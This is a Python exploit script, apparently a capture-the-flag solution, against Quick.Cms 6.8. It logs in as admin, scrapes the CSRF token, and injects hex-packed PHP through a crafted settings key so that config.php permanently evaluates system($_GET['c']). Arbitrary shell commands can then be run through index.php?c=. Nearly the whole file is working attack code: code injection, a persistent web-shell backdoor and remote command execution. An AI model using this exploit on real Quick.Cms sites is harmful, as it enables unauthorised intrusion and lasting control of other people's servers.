#!/usr/bin/env python3
"""Persistent GET-backdoor for Quick.Cms 6.8 via saveVariables key injection.

State model of the config.php corruption:
- Line 78 (old admin_file line): eval(cat database/config.php)  -> permanent noise, harmless
- Each call plants eval(system($_GET['c'])) on a FRESH stock line, then we
  just GET index.php?c=CMD with no further settings POSTs needed.

Usage:
  python3 cms_backdoor.py plant    # plant the ?c= backdoor (idempotent-ish: new key each time)
  python3 cms_backdoor.py "cmd"    # run command via ?c=
"""
import sys, re, base64, requests

BASE = "http://127.0.0.1:8765/"
USER = "contextgrave-admin@chal.sh"
PASS = "admin"

# stock scalar config lines usable as branch1 anchors (must still be pristine)
FRESH_KEYS = ["wysiwyg", "skin", "admin_lang", "default_language",
              "page_link_in_navigation_path", "delete_unused_files",
              "short_to_full_description", "enable_files_uploader_dropzone",
              "max_image_size", "image_quality", "change_files_names",
              "time_diff", "default_theme", "default_pages_menu",
              "default_image_size", "advanced_select_default_width"]

def sess():
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0"})
    s.trust_env = False
    return s

def login(s):
    for _ in range(3):
        r = s.post(BASE + "admin.php?p=login",
                   data={"sEmail": USER, "sPass": PASS,
                         "bAcceptLicense": "1", "iAcceptLicense": "true"},
                   timeout=25)
        if "p=logout" in r.text:
            return True
    return False

def csrf(s):
    r = s.get(BASE + "admin.php?p=settings", timeout=25)
    m = re.search(r'name="sCsrfToken" value="([0-9a-f]+)"', r.text)
    return m.group(1) if m else None

def hexify(code):
    return base64.b16encode(code.encode()).decode()

def inject(s, tok, anchor, code):
    """anchor = pristine stock config key (branch1). code = PHP to eval."""
    key = "%s|'];eval(pack('H*','%s'));#" % (anchor, hexify(code))
    data = {"sOption": "save", "sCsrfToken": tok, key: "0"}
    return s.post(BASE + "admin.php?p=settings", data=data, timeout=25,
                  allow_redirects=False).status_code

def rce(s, cmd):
    r = s.get(BASE + "index.php", params={"c": cmd}, timeout=60)
    # strip the permanent cat-noise: everything up to the last cat artifact
    t = r.text
    # backdoor output comes after the cat noise (line78 evals first)
    # noise ends with the config file's tail: time_diff line + trailing PHP
    return t

def main():
    s = sess()
    if not login(s):
        print("login failed"); sys.exit(1)
    tok = csrf(s)
    print("csrf:", tok)
    mode = sys.argv[1] if len(sys.argv) > 1 else "plant"

    if mode == "plant":
        # ONE injection on ONE anchor; verify marker immediately; STOP on success.
        code = "system($_GET['c']);"
        anchor = sys.argv[2] if len(sys.argv) > 2 else "wysiwyg"
        rc = inject(s, tok, anchor, code)
        print("anchor %-35s rc=%s" % (anchor, rc))
        if rc == 302:
            r = s.get(BASE + "index.php", params={"c": "echo BKD69_OK"},
                      timeout=60)
            print("marker:", "BKD69_OK" in r.text)
            if "BKD69_OK" in r.text:
                print("BACKDOOR LIVE via anchor:", anchor)
                open("/ctf/agent-6/assets_extracted/bkd_anchor.txt", "w").write(anchor)
                return
        print("plant failed on", anchor)
    else:
        cmd = mode
        r = s.get(BASE + "index.php", params={"c": cmd}, timeout=90)
        print("len:", len(r.text))
        print(r.text)

if __name__ == "__main__":
    main()